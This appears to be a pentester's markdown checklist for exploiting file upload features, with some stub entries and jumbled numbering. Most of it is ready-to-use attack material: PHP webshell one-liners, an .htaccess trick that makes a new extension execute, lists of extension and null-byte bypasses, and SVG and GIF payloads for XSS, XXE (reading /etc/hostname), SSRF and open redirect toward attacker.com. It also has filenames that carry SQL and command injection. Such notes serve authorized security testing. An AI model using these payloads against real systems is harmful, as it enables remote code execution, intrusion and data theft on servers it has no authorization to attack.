1. Try uploading a webshell

2. If the **application only checks the content-type** which has the MIME type of the file, then try to ulpload a webshell

3. Upload file in different directory where execution of certain files may not have been restricted by naming the file **../exploit.php** or **..%2fexploit.php** i.e. encoding the slash

4. bloah

5. If blacklisting is done the application may fail to recognise some different extension which server similar purpose like
```text
.php .php5 etc
```

6. **Making changes to config file** by uploading different configuration to configuraton file in-order to instruct the server to excute a particular extension, like in an *apache server* uploading config by keeping the **file name as .htaccess** and **Content-Type to text/plain** and contents of file as:
```php
AddType application/x-httpd-php .l33t
```

7. Obfuscating extensions to bypass blacklists
	1. Provide multiple extensions. Depending on the algorithm used to parse the filename, the following file may be interpreted as either a PHP file or JPG image: **_exploit.php.jpg**

	2. Add trailing characters. Some components will strip or ignore trailing whitespaces, dots, and suchlike: ***exploit.php.***
	3. Try using the URL encoding (or double URL encoding) for dots, forward slashes, and backward slashes. If the value isn't decoded when validating the file extension, but is later decoded server-side, this can also allow you to upload malicious files that would otherwise be blocked: ***exploit%2Ephp***
	4. Add semicolons or URL-encoded null byte characters before the file extension. If validation is written in a high-level language like PHP or Java, but the server processes the file using lower-level functions in C/C++, for example, this can cause discrepancies in what is treated as the end of the filename: **exploit.asp;.jpg or *exploit.asp%00.jpg***
	5. Try using multibyte unicode characters, which may be converted to null bytes and dots after unicode conversion or normalization. Sequences like xC0 x2E, xC4 xAE or xC0 xAE may be translated to x2E if the filename parsed as a UTF-8 string, but then converted to ASCII characters before being used in a path.
	6. If application strips away dangerous extensions but if it's not doing it recursively then we can make the file still have the extension: **_exploit.p.phphp_**
	7. ss

8. When webserver checks the contents of the file then try replacing the starting characters which are constant for file types like JPEG always starts with **FF D8 FF**. Make a polyglot payload [[Vulns (checklist)/File upload/archive#^64b892|read]]

9. [[File uploads#Exploiting file upload race conditions]]


11. Test XSS through file upload
Upload **.svg** file like following:
```XML
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
   <script type="text/javascript">
      alert("XSS");
   </script>
</svg>
```
with the content-type
```http
Content-Disposition: form-data; name="img"; filename="img.svg"
Content-Type: image/svg+xml
```
We could also use a **.gif** file for XSS
```text
GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
```
Try naming the file with an XSS payload like **filename="svg onload=alert(document.domain)>"** or  **filename="58832_300x300.jpg\<svg onload=confirm()>"** 

11. Make an XXE payload in a file with extension such as .doc, .xls, .svg
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="500px" height="500px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="40" x="0" y="16">&xxe;</text>
</svg>
```
13. Instead of **POST** method try using **PUT**

15. Try capatalizing/modifying extension like **.php** to **.pHp**

16. Extension impact
```text
ASP, ASPX, PHP5, PHP, PHP3 -> Webshell, RCE

SVG -> Stored XSS, SSRF, XXE

GIF -> Stored XSS, SSRF

CSV -> CSV injection

XML -> XXE

AVI -> LFI, SSRF

HTML, JS -> HTML injection, XSS, Open redirect

PNG, JPEG -> Pixel flood attack (DoS)

ZIP -> RCE via LFI, DoS

PDF, PPTX -> SSRF, BLIND XXE
```
15. Blacklisting bypass
```text
PHP → .phtm, phtml, .phps, .pht, .php2, .php3, .php4, .php5, .shtml, .phar, .pgif, .inc

ASP → asp, .aspx, .cer, .asa

Jsp → .jsp, .jspx, .jsw, .jsv, .jspf

Coldfusion → .cfm, .cfml, .cfc, .dbm

Using random capitalization → .pHp, .pHP5, .PhAr
```
16. White-listing bypass
```text
file.jpg.php
file.php.jpg
file.php.blah123jpg
file.php%00.jpg
file.php\x00.jpg this can be done while uploading the file too, name it file.phpD.jpg and change the D (44) in hex to 00.

file.php%00
file.php%20
file.php%0d%0a.jpg
file.php.....
file.php/
file.php.\
file.php#.png
file.
.html
```
17. Try [[SQL injection|Blind SQL injection]] using payloads like **'sleep(10).jpg** or **sleep(10)-- -.jpg**

19. Try [[command injection|command injection]] using payloads like **; sleep 10;**

20. [[Vulns (checklist)/SSRF/SSRF|SSRF]] through **.svg** file
```xml
<?xml version="1.0" encoding="UTF-8" standalone="no"?><svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"><image height="200" width="200" xlink:href="https://attacker.com/picture.jpg" /></svg>
```
21. Trying **Open-redirect** using an **.svg** extension
```xml
<code>
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<svg
onload="window.location='https://attacker.com'"
xmlns="http://www.w3.org/2000/svg">
<rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
</svg>
</code>
```


---
## Webshells
```php
<?php system($_GET['cmd']); ?>
```
```php
(<?=`$_GET[x]`?>)
```
